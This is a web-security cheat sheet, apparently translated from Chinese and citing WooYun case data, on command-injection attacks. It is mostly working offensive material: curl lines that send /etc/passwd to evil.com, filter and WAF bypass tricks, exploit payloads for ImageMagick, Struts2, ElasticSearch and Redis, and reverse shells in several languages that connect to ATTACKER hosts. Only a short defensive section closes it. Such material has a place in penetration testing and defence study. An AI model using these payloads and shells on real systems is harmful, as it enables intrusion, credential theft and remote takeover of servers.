# Web Security - Command Execution (RCE)

> Source: WooYun Vulnerability Database (6,826 RCE Case)| Dismantled From web-injection.md

## Three、Command execution

### 3.1 Nature of vulnerabilities

```
User input(Data) -> Unpurified Splicing -> Enter system commands/Code execution context -> OSInstruction execution
```

**Core formula**: Command execution = Data flow contamination. + Execution context (Shell/Code/Expression)

### 3.2 Detection method

#### High-frequency entry points

| Entry type | Proportion | Typical scenarios |
|---------|------|---------|
| File operation | 68% | Upload、Read、Unzip |
| System command function | 62% | exec/system/shell_exec |
| Struts2Framework | 50% | OGNLExpression injection |
| SSRF | 30% | URLParameter passing |
| pingCommand | 26% | Network Diagnostics Function |
| Image processing | 24% | ImageMagick |
| JavaDeserialization | 20% | WebLogic/JBoss |

#### Command concatenation symbol

| Symbol | Meaning | Execution logic |
|------|------|---------|
| `;` | Separator | Execute in order, regardless of the previous command results |
| `\|` | Pipeline | Previous output as subsequent input |
| `` ` `` / `$()` | Command injection | Execute Internal Commands and Return Results |
| `\|\|` | Logical OR | Execute later after failure |
| `&&` | Logic and | Only execute after the previous success |
| `%0a` / `%0d%0a` | New line | URLEncoded newline separated |

#### No echo detection

```bash
# DNSLogTakeaway
ping `whoami`.xxxxx.ceye.io
curl http://`whoami`.xxxxx.ceye.io

# HTTPTakeaway
curl https://evil.com/?d=`cat /etc/passwd | base64 | tr '\n' '-'`
curl -X POST -d "data=$(cat /etc/passwd)" https://evil.com/c

# Time delay
sleep 5
ping -c 5 127.0.0.1

# File WriteWebDirectory
echo "test" > /var/www/html/proof.txt
```

### 3.3 Bypassing techniques

#### Space Bypass

```bash
cat${IFS}/etc/passwd          # ${IFS}Internal field separator
cat$IFS$9/etc/passwd          # $9Empty position parameters
cat%09/etc/passwd             # TabTab
cat</etc/passwd               # Redirection symbol
{cat,/etc/passwd}             # Brace expansion
```

#### Keyword bypass

```bash
# Quotation Marks/Backslash split
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# Variable concatenation
a=c;b=at;$a$b /etc/passwd

# Wildcard
/bin/ca* /etc/passwd
/bin/c?t /etc/passwd
/???/??t /etc/passwd
```

#### catCommand substitution.

```bash
tac  head  tail  more  less  nl  sort  uniq  od -c  xxd  base64  rev  paste
```

#### Encoding bypass

```bash
# Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"

# Hex
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

### 3.4 Utilize chain andPayload

#### Framework/Component VulnerabilitiesPayload

**ImageMagick (CVE-2016-3714)**:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|bash -i >& /dev/tcp/ATTACKER/8080 0>&1 &")'
pop graphic-context
```

**Struts2 S2-045**:

```
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```

**Struts2 OGNLGeneric Command Execution**:

```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
```

**ElasticSearch GroovySandbox bypass**:

```json
{"size":1,"script_fields":{"x":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

**RedisUnauthorized writeSSHPublic key/Crontab**:

```bash
redis-cli -h target
config set dir /root/.ssh && config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n" && save
# Or writecrontab
config set dir /var/spool/cron && config set dbfilename root
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/8080 0>&1\n\n" && save
```

#### BounceShellCollection

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# NCNone-eParameters
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER",PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}
```

#### PHPDangerous Function Level

| Hierarchy | Functions | Capability |
|-----|------|-----|
| L1Code Level | `eval()`, `assert()(PHP5)`, `create_function()`, `preg_replace(/e)` | PHPCode execution. |
| L2 ShellLevel | `system()`, `passthru()`, `shell_exec()`, Backtick | System commands have echo |
| L3Process level | `exec()`, `popen()`, `proc_open()`, `pcntl_exec()` | Child process execution |
| L4Callback level | `call_user_func()`, `array_map()` | Indirect Function Call |

#### PHP WAFBypassing techniques

```php
// String concatenation
$func = 'sys'.'tem'; $func('whoami');
// Variable function.
$a='sys';$b='tem';($a.$b)('whoami');
// Code Obfuscation
base64_decode('c3lzdGVt')           // system
str_rot13('flfgrz')                 // system
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) // system
// String operations.
strrev('metsys')('whoami');
implode('',array('s','y','s','t','e','m'))('whoami');
```

#### disable_functionsBypass

| Method | Principle | Conditions |
|-----|------|-----|
| LD_PRELOAD | Hijacking system library functions,mail()Triggering the loading of malicious.so | Uploadable.so + mail()Available |
| Shellshock | Bash<=4.3Environment Variable Injection | Old versionBash |
| Apache Mod_CGI | .htaccessConfigurationCGIExecute | Apache + AllowOverride |
| PHP-FPM/FastCGI | ModifyPHPConfiguration Execution Code | AccessibleFPMPort/SSRF |
| ImageMagick | delegateFunction command execution | UseIMProcessing images. |
| Windows COM | WScript.ShellComponents | Windows + COMExpansion |

**LD_PRELOADCore exploitation**:

```php
// Upload malicious.so(HijackinggeteuidFunction, internal callssystem())
putenv("LD_PRELOAD=/tmp/exploit.so");
mail("a@a.com","test","test");  // mail()StartsendmailProcess -> Load.so -> Execute Command
```

### 3.5 Defensive measures

```php
// Best practices: whitelist verification + escapeshellarg
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    system("ping " . escapeshellarg($_GET['ip']));
}
```

- Avoid direct system command calls, use language built-in functions instead
- Parameterized execution (array parameter passing), prohibit string concatenation
- `escapeshellarg()` + `escapeshellcmd()` Escape
- Whitelist validation input + Type checking
- `disable_functions` Disable dangerous functions (note bypass risks)
- Run with minimal privilegesWebService + Container/chrootIsolation
- Timely update framework components (Struts2/WebLogic/ImageMagickEtc.)

---

